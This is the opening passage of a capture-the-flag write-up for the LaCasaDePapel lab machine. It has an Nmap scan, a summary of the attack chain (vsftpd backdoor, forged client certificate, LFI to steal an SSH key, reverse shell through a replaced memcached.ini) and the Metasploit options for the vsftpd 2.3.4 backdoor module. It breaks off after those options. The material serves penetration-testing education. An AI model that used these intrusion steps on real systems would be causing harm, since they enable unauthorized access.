<center><h1>LaCasaDePapel</h1></center>
<br>
<center><h3>Summary</h3></center>
<br>
- Use an old FTP exploit to open a backdoor on the box allowing us to get a Psy php shell
- Grab a CA key file off the box and a CA crt from the webpage
- Use the CA key file and CA crt file to generate a .p12 file and log into the webpage
- Use an LFI vulnerability to grab and SSH private key
- Use the private key to SSH in
- Replace the memcached.ini file with our own to spawn a reverse shell
<br><br>
First we start with an Nmap scan.
```
# Nmap 7.70 scan initiated Mon May 27 18:16:51 2019 as: nmap -sV -sC -T4 10.10.10.131
Nmap scan report for 10.10.10.131
Host is up (0.11s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 27 18:17:24 2019 -- 1 IP address (1 host up) scanned in 32.68 seconds
```
<br>
A few ports are open but the one that peaks my interest is FTP. I know for a face that <b>vsftpd 2.3.4</b> is vulnerable. I will use the metasploit module <b>exploit/unix/ftp/vsftpd_234_backdoorv2.3.4 Backdoor Command Execution</b> for this.
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
The only thing that we have to set is the RHOSTS.
